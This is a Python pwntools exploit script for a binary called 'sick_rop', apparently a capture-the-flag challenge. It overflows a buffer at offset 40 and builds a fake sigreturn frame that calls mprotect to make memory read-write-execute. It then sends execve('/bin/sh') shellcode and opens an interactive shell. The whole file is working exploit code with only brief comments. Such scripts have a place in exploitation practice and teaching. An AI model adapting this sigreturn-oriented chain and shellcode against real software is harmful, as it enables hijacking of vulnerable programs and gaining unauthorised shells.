
from pwn import *

elf = ELF('./sick_rop')
#if args.R:
 #p = remote("*.*.*.*",30479)
#else:
 #p = elf.process()
p = elf.process()
gdb.attach(p,gdbscript='''
           b*vuln+18
           b*vuln+32
           ''')
context.clear(arch='amd64')
context.log_level = 'debug'

syscall_ret = 0x401014
read = 0x401000
writable = 0x400000
new_ret = 0x400018
vuln = elf.sym.vuln

payload = b'A'*40    # to our offset
payload += p64(vuln)
payload += p64(syscall_ret)

frame = SigreturnFrame(kernel="amd64")
frame.rax = 0xa     # syscall for mprotect()
frame.rdi = writable
frame.rsi = 0x4000
frame.rdx = 0x7    # rwx (read ,write , execute)
frame.rsp = 0x4010d8 # this will be our new stack kind of ie addr 0x400...
frame.rip = syscall_ret

payload += bytes(frame) # fake sigreturnframe

# sending
input()
p.sendline(payload)
p.recv()

payload = b'B'* (0xf - 1 ) # sigret 15 syscall
p.sendline(payload)
p.recv()

# shellcode
shell_code = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"
payload = shell_code.ljust(40, b'A')
payload += p64(0x4010b8)
log.info('[*] Sending second stage payload with {} bytes ...'.format(len(payload)))
p.sendline(payload)

p.interactive()
